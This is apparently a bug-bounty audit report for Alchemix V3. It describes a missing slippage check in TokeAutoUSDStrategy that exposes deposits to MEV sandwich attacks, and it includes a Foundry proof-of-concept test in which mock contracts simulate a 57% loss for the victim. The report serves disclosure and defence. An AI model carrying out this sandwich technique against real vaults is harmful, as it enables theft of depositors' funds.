# 58150 sc high missing slippage protection in tokeautousdstrategy allocate leads to direct theft of user funds via mev sandwich attacks

**Submitted on Oct 30th 2025 at 23:33:23 UTC by @fawarano for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58150
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/strategies/mainnet/TokeAutoUSDStrategy.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

The `TokeAutoUSDStrategy` contract fails to implement slippage protection when depositing assets into the Tokemak AutoUSD vault via the `depositMax` function is called with `minSharesOut` parameter set to 0 . This vulnerability enables MEV sandwich attacks where an attacker can manipulate the underlying pool prices (via flash loans) during the victim's deposit transaction, resulting in important money loss for depositors.

## Vulnerability Details

In the `_allocate` function of `TokeAutoUSDStrategy.sol` (line 45), the `depositMax` function is called with `minSharesOut` parameter set to 0:

```solidity
function _allocate(uint256 amount) internal override returns (uint256) {
    require(TokenUtils.safeBalanceOf(address(usdc), address(this)) >= amount, "Strategy balance is less than amount");
    TokenUtils.safeApprove(address(usdc), address(router), amount);
@>     uint256 shares = router.depositMax(autoUSD, address(this), 0); 
    TokenUtils.safeApprove(address(autoUSD), address(rewarder), shares);
    rewarder.stake(address(this), shares);
    return amount;
}
```

This means there is no minimum requirement or the number of vault shares received in return for the deposited USDC into the vault. As a result, if after a deposit is initiated and a MEV bot sees the transaction and then attempts to manipulate the value of USDC against the Share by attacking the vault with a flash loan that will drastically increase the price of the Shares, the user will receive a much lower value of Shares than they were supposed to get. This represents a significant loss for the user because they did not set the minimum number of Shares to receive after their deposit.

## Impact Details

This vulnerability has a high impact because it directly allows measurable, reproducible loss of user funds through price manipulation during deposits. By setting minSharesOut = 0, the strategy removes any slippage protection, making depositors fully exposed to MEV and flash-loan attacks. During such an attack, an attacker can temporarily inflate the vault’s share price before the victim’s transaction is executed(by flash loan attack ). As a result, the depositor receives significantly fewer shares than expected, often losing a large percentage of their value (in one observed case, roughly 57% depending on how much the attacker inflate the vault share value ). Since the attacker can reverse the manipulation within the same block, the vault’s global state appears normal afterward, leaving victims with no on-chain recovery mechanism. In vaults with limited liquidity or predictable deposit activity, this exploit can be consistently replicated to extract value, eroding depositor trust and protocol integrity over time.

## References

Add any relevant links to documentation or code

* [TokeAutoUSDStrategy.sol:45](https://github.com/alchemix-finance/v3-poc/blob/immunefi_audit/src/strategies/mainnet/TokeAutoUSDStrategy.sol?utm_source=immunefi) - Vulnerable code location
* [ERC4626 Inflation Attack Analysis](https://docs.openzeppelin.com/contracts/4.x/erc4626#inflation-attack)
* [Tokemak v2-core AutopilotRouter](https://github.com/Tokemak/v2-core-pub/blob/main/src/vault/AutopilotRouter.sol)
* [MEV Sandwich Attacks](https://github.com/flashbots/mev-research)
* [Immunefi PoC Guidelines](https://immunefisupport.zendesk.com/hc/en-us/articles/9946217628561-Proof-of-Concept-PoC-Guidelines-and-Rules)

## Link to Proof of Concept

<https://gist.github.com/fawarano/44b7c1af394c072cb259432dc718f731>

## Proof of Concept

## Proof of Concept

A complete working PoC demonstrates the vulnerability with realistic attack parameters. The PoC shows around `57% loss for the victim` and `28,571 USDC profit for the attacker`.

The PoC consists of two files:

1. `src/test/TokeAutoUSDMocks.sol` - Mock contracts simulating Tokemak ecosystem
2. **`src/test/TokeAutoUSD_SandwichPoC.t.sol`** - Attack simulation test

PoC: Price Manipulation Attack Against TokeAutoUSDStrategy

VULNERABILITY: TokeAutoUSDStrategy.sol: sets minSharesOut=0, providing NO SLIPPAGE PROTECTION uint256 shares = router.depositMax(autoUSD, address(this), 0);

ATTACK FLOW: 1. Attacker manipulates underlying pool prices (flash loan / MEV attack) 2. Victim deposits at inflated price → receives heavily diluted shares 3. Attacker reverts price manipulation 4. Victim's diluted shares are worth much less at normal price

RESULT: large loss for victim, attacker profits

TESTING APPROACH: This PoC uses mock contracts to demonstrate the vulnerability logic while complying with Immunefi rules prohibiting mainnet/testnet testing. - Mock contracts simulate Tokemak AutoUSD ecosystem behavior - Tests actual TokeAutoUSDStrategy.sol code via harness pattern - Demonstrates standard ERC4626 share dilution mechanics - All testing performed in isolated local environment

Run with: `forge test --match-path src/test/TokeAutoUSD_SandwichPoC.t.sol -vv --evm-version cancun`

```solidity

contract TokeAutoUSD_SandwichPoC is Test {
    MockUSDC public usdc;
    MockAutoUSDVault public autoUSD;
    MockAutopilotRouter public router;
    MockMainRewarder public rewarder;
    TokeAutoUSDStrategyHarness public strategy;

    address attacker = address(0x1);

    uint256 constant INITIAL_VAULT_LIQUIDITY = 100_000e6;
    uint256 constant ATTACKER_DEPOSIT = 100_000e6;
    uint256 constant VICTIM_DEPOSIT = 100_000e6;
    uint256 constant PRICE_MULTIPLIER = 3e18; // 3x price inflation

    function setUp() public {
        usdc = new MockUSDC();
        autoUSD = new MockAutoUSDVault(address(usdc));
        router = new MockAutopilotRouter();
        rewarder = new MockMainRewarder();

        IMYTStrategy.StrategyParams memory params = IMYTStrategy.StrategyParams({
            owner: address(this),
            name: "TokeAutoUSD Test Strategy",
            protocol: "Tokemak",
            riskClass: IMYTStrategy.RiskClass.LOW,
            cap: 10_000_000e6,
            globalCap: 100_000_000e6,
            estimatedYield: 10e18,
            additionalIncentives: false,
            slippageBPS: 30
        });

        strategy = new TokeAutoUSDStrategyHarness(
            address(new MockVaultV2()),
            params,
            address(usdc),
            address(autoUSD),
            address(router),
            address(rewarder),
            address(0x456)
        );

        // Setup vault with initial liquidity
        usdc.mint(address(this), INITIAL_VAULT_LIQUIDITY);
        usdc.approve(address(autoUSD), INITIAL_VAULT_LIQUIDITY);
        autoUSD.deposit(INITIAL_VAULT_LIQUIDITY, address(this));

        // Attacker deposits
        usdc.mint(attacker, ATTACKER_DEPOSIT);
        vm.startPrank(attacker);
        usdc.approve(address(autoUSD), type(uint256).max);
        autoUSD.deposit(ATTACKER_DEPOSIT, attacker);
        vm.stopPrank();

        // Fund strategy with victim's USDC
        usdc.mint(address(strategy), VICTIM_DEPOSIT);
        vm.prank(address(strategy));
        usdc.approve(address(router), type(uint256).max);
    }

   
    function testSandwichAttack() public {
        // Initial state
        uint256 initialVaultAssets = autoUSD.totalAssets();
        uint256 initialVaultShares = autoUSD.totalSupply();
        console.log("=== Initial State ===");
        console.log("Vault assets:", initialVaultAssets / 1e6, " USDC");
        console.log("Vault shares:", initialVaultShares);
        console.log("Share price: 1.0 USDC per share\n");

        // STEP 1: Attacker manipulates price
        console.log("=== STEP 1: Front-Run - Price Manipulation ===");
        console.log("Attacker manipulates underlying pools (flash loan attack)");
        autoUSD.manipulateSharePrice(PRICE_MULTIPLIER);
        console.log("Price inflated to:", PRICE_MULTIPLIER / 1e18, "x\n");

        // STEP 2: Victim deposits at inflated price
        console.log("=== STEP 2: Victim Deposits (No Slippage Protection) ===");
        console.log("Victim deposits:", VICTIM_DEPOSIT / 1e6, " USDC");
        console.log("Via: router.depositMax(vault, address(this), 0)");
        console.log("                                            ^--- minSharesOut = 0!\n");

        uint256 expectedSharesFair = (VICTIM_DEPOSIT * initialVaultShares) / initialVaultAssets;
        strategy.allocate(VICTIM_DEPOSIT);
        uint256 victimShares = rewarder.balanceOf(address(strategy));

        console.log("Expected shares (fair):", expectedSharesFair);
        console.log("Actual shares received:", victimShares);
        console.log("Share dilution:", ((expectedSharesFair - victimShares) * 100) / expectedSharesFair, "%\n");

        // STEP 3: Attacker reverts price
        console.log("=== STEP 3: Back-Run - Price Reverted ===");
        console.log("Attacker closes flash loan, price returns to normal");
        autoUSD.manipulateSharePrice(1e18);

        uint256 victimSharesValueAfterRevert = autoUSD.convertToAssets(victimShares);
        uint256 attackerSharesValue = autoUSD.convertToAssets(autoUSD.balanceOf(attacker));
        console.log("Victim's shares now worth:", victimSharesValueAfterRevert / 1e6, " USDC");
        console.log("Attacker's shares worth:", attackerSharesValue / 1e6, " USDC\n");

        // STEP 4: Victim withdraws
        console.log("=== STEP 4: Victim Withdraws ===");
        vm.startPrank(address(strategy));
        rewarder.withdraw(address(strategy), victimShares, false);
        uint256 victimWithdrawn = autoUSD.redeem(victimShares, address(strategy), address(strategy));
        vm.stopPrank();

        console.log("Victim withdrew:", victimWithdrawn / 1e6, " USDC\n");

        // Final results
        console.log("=============================================================");
        console.log("FINAL RESULTS");
        console.log("=============================================================");
        uint256 victimLoss = VICTIM_DEPOSIT - victimWithdrawn;
        uint256 victimLossPercent = (victimLoss * 100) / VICTIM_DEPOSIT;
        uint256 attackerProfit = attackerSharesValue > ATTACKER_DEPOSIT ? attackerSharesValue - ATTACKER_DEPOSIT : 0;

        console.log("VICTIM:");
        console.log("  Deposited:", VICTIM_DEPOSIT / 1e6, " USDC");
        console.log("  Withdrew:", victimWithdrawn / 1e6, " USDC");
        console.log("  LOSS:", victimLoss / 1e6, " USDC");
        console.log("  LOSS %:", victimLossPercent, "%");
        console.log("");
        console.log("ATTACKER:");
        console.log("  Profit:", attackerProfit / 1e6, " USDC (minus MEV costs)");

        // Assertions
        assertTrue(victimShares > 0, "Victim should receive some shares");
        assertTrue(victimLoss > 50_000e6, "Victim should lose >50k USDC");
        assertTrue(victimLossPercent >= 50, "Victim should lose >=50%");
        assertTrue(victimWithdrawn < VICTIM_DEPOSIT, "Victim withdrew less than deposited");
    }
}

```
